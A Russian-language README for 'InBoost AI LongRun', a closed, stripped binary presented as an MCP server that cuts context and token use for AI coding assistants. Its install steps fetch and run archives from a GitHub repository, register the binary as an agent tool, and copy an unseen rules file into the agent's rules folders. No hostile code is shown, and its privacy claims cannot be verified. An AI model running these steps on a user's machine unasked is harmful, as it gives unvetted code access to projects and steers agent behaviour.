# InBoost AI LongRun — Руководство по установке и использованию
### Высокопроизводительный модуль локальной оптимизации контекста и защиты квот для Claude Code, Google Antigravity (`agy`) и Cursor

**Версия:** 1.0.0  
**Лицензия:** Ознакомительная лицензия на 1 месяц (активна до 11 ноября 2026 г.)  
**Поддерживаемые платформы:**
* **Linux x86_64 (Универсальная статическая сборка):** 100% статическая линковка (чистый статический ELF, нулевая зависимость от версий libc). Работает на Ubuntu (любых версий), Debian, CentOS, RHEL, Alpine (musl), Arch, WSL и Docker scratch.
* **Linux ARM64:** Универсальная статическая сборка для ARM-серверов (AWS Graviton, Ampere, Raspberry Pi 4/5).
* **macOS Universal:** Нативные оптимизированные сборки для Apple Silicon (M1/M2/M3/M4, `darwin-arm64`) и Intel (`darwin-amd64`).
* **Windows x86_64:** Автономный исполняемый файл `inboost-longrun.exe` без внешних зависимостей.

**Приватность:** InBoost LongRun выполняется локально и не передает код вовне. Все операции оптимизации и фильтрации выполняются строго на вашей машине.

---

## ⚡️ Быстрый старт и установка

### 1. Скачивание пакета под вашу ОС

#### Вариант А: Linux (Universal x86_64)
```bash
mkdir -p ~/inboost-longrun && cd ~/inboost-longrun
curl -L -O https://github.com/inboost-dev/benchmarks-reports/raw/main/downloads/inboost-longrun-linux-x86_64.tar.gz
tar -xzf inboost-longrun-linux-x86_64.tar.gz
chmod +x inboost-longrun
```

#### Вариант Б: Linux (ARM64)
```bash
mkdir -p ~/inboost-longrun && cd ~/inboost-longrun
curl -L -O https://github.com/inboost-dev/benchmarks-reports/raw/main/downloads/inboost-longrun-linux-arm64.tar.gz
tar -xzf inboost-longrun-linux-arm64.tar.gz
chmod +x inboost-longrun-linux-arm64
ln -sf inboost-longrun-linux-arm64 inboost-longrun
```

#### Вариант В: macOS (Apple Silicon M1/M2/M3/M4 & Intel)
```bash
mkdir -p ~/inboost-longrun && cd ~/inboost-longrun
curl -L -O https://github.com/inboost-dev/benchmarks-reports/raw/main/downloads/inboost-longrun-macos.tar.gz
tar -xzf inboost-longrun-macos.tar.gz
chmod +x inboost-longrun-darwin inboost-longrun-darwin-arm64 inboost-longrun-darwin-amd64
ln -sf inboost-longrun-darwin inboost-longrun
```

#### Вариант Г: Windows (x86_64 PowerShell)
```powershell
New-Item -ItemType Directory -Force -Path "$HOME\inboost-longrun"
Set-Location "$HOME\inboost-longrun"
Invoke-WebRequest -Uri "https://github.com/inboost-dev/benchmarks-reports/raw/main/downloads/inboost-longrun-windows-x86_64.zip" -OutFile "inboost.zip"
Expand-Archive -Path "inboost.zip" -DestinationPath "." -Force
```

---

### 2. Проверка статуса и лицензии

Запустите бинарник с флагом `--status`:

```bash
# Linux / macOS:
./inboost-longrun --status

# Windows PowerShell:
.\inboost-longrun.exe --status
```

**Ожидаемый вывод:**
```text
InBoost AI LongRun (Local Acceleration Engine) v1.0.0
Status:         ACTIVE
License:        [InBoost LongRun] Active 1-Month Evaluation License (Expires: 2026-11-11T23:59:59Z, 31.8 days remaining)
Savings Engine: Active (-75%..-98% context reduction)
```

---

## 🛠 Подключение к вашему ИИ-ассистенту

### Сценарий 1: Claude Code

Claude Code подключает инструменты через Model Context Protocol (MCP) одной командой:

```bash
# Linux / macOS (укажите абсолютный путь):
claude mcp add inboost-longrun $(pwd)/inboost-longrun

# Windows PowerShell:
claude mcp add inboost-longrun "$((Get-Item .).FullName)\inboost-longrun.exe"
```

Проверить подключение:
```bash
claude mcp list
```

#### Добавление правил оптимизации:
Скопируйте файл правил в корень вашего рабочего проекта:
```bash
mkdir -p .claude/rules
cp inboost_rules.md .claude/rules/inboost_longrun.md
```

---

### Сценарий 2: Google Antigravity (`agy`)

```bash
# 1. Регистрация MCP-сервера в agy
agy mcp add inboost-longrun $(pwd)/inboost-longrun

# 2. Проверка подключения
agy mcp list

# 3. Активация правил в репозитории
mkdir -p .agents/rules
cp inboost_rules.md .agents/rules/inboost_longrun.md
```

---

### Сценарий 3: Cursor / Windsurf

Создайте или дополните файл `.cursor/mcp.json` в корне вашего проекта:

**Linux / macOS:**
```json
{
  "mcpServers": {
    "inboost-longrun": {
      "command": "/абсолютный/путь/к/inboost-longrun"
    }
  }
}
```

**Windows:**
```json
{
  "mcpServers": {
    "inboost-longrun": {
      "command": "C:\\Users\\ВашПользователь\\inboost-longrun\\inboost-longrun.exe"
    }
  }
}
```

---

## 🎯 Сценарии повседневного использования

После подключения ассистент автоматически использует 6 инструментов локальной оптимизации:

### 1. Исследование кода без раздувания контекста (`l0_view_outline`)
Когда ассистенту требуется сориентироваться в структуре большого файла, он запрашивает краткий обзор ключевых определений вместо чтения всего исходного кода:
* Модель моментально получает представление о структуре файла, сохраняя полезную емкость окна контекста.

### 2. Запуск тестов и изоляция ошибок (`l0_run_test`, `l0_clean_test_log`)
При выполнении тестов вывод нормализуется локально:
* Инструмент отсекает избыточные системные логи окружения и оставляет только критическую информацию о сбое для быстрого устранения дефекта.

### 3. Предварительная валидация кода (`l0_verify_syntax`)
Перед применением изменений агент проверяет корректность структуры:
* Исключает появление синтаксических ошибок в рабочей копии.

### 4. Контроль фокуса изменений (`l0_verify_edit_scope`)
Обеспечивает точечные, аккуратные изменения:
* Защищает от избыточных правок и раздувания контекста диалога.

### 5. Просмотр отчета об экономии (`l0_savings_report`)
В любой момент диалога вы можете попросить ассистента показать статистику:
> *"Покажи отчет об экономии токенов InBoost"*

Агент отобразит накопительную статистику сессии:
```text
================================================================
           INBOOST LONGRUN CUMULATIVE SAVINGS SCORECARD          
================================================================

• Total Prompt Tokens Saved:    48,200 tokens
• Estimated API Cost Saved:     $0.1446 USD
• Rate-Limit Window Extended:   +4.2x quota windows
• Files Summarized:             12 (-95% token reduction)
• Test Outputs Filtered:        6 (-90% noise elimination)
• Code Verifications:           18 (100% clean)
• Session Runtime:              45.2 minutes
================================================================
```

---

## 🔒 Безопасность и защита от анализа

1. **Безопасная статическая сборка:**  
   Скомпилирован в чистый машинный код с флагами стриппинга отладочных символов (`-s -w`, `strip`). Отсутствуют открытые скрипты.
2. **Нулевая зависимость от libc на Linux:**  
   Сборка для Linux полностью статическая (`statically linked`, не требует динамического загрузчика или конкретной версии glibc).
3. **Никакой телеметрии и внешних вызовов:**  
   InBoost LongRun выполняется локально и не передает код вовне. Все операции выполняются исключительно на вашей машине без исходящих сетевых соединений.

---

## ❓ Часто задаваемые вопросы (FAQ)

**В: Будет ли работать бинарник на старом Linux сервере без glibc 2.38?**  
О: Да. Linux-сборка полностью статическая (zero libc dependencies) и работает на любом дистрибутиве Linux с ядром 2.6+.

**В: С какими моделями совместим модуль?**  
О: InBoost LongRun работает независимо от используемой модели (Claude 3.5 Sonnet, Claude 3.7 Sonnet, GPT-4o, DeepSeek V3/R1, Qwen 2.5 Coder, Gemini 2.5 Flash/Pro).
